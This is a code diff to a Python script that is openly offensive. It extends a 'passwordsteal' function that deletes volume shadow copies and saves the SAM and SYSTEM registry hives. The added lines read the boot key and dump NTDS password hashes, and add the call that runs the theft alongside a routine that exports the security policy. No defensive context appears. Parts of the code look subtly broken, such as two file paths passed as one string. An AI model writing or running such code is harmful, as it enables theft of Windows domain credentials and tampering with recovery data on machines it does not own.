@@ -1,4 +1,7 @@
 import subprocess
+from framework import readNTDS
+from framework.readNTDS import NTDSHashes
+from framework import samdumpy2
 
 def disableEncryption():
     proc = subprocess.run(["powershell", "-command", r"secedit /export /cfg C:\secpol.cfg"], capture_output=True)
@@ -30,8 +33,12 @@ def passwordsteal():
     subprocess.run("vssadmin delete shadows /shadow=" + proc[2].split(" ")[1])
     subprocess.run("reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM")
     subprocess.run("reg save HKLM\\SAM C:\\Windows\\Temp\\SAM")
-
+    ntdsfile = open("\\Windows\\Temp\\ntds.dit")
+    bootkey = samdumpy2.getsyskey("C:\\Windows\\Temp\\SAM C:\\Windows\\Temp\\SYSTEM")
+    secretdata = NTDSHashes(ntdsfile, bootkey)
+    secretdata.dump()
 
 
 
 disableEncryption()
+passwordsteal()
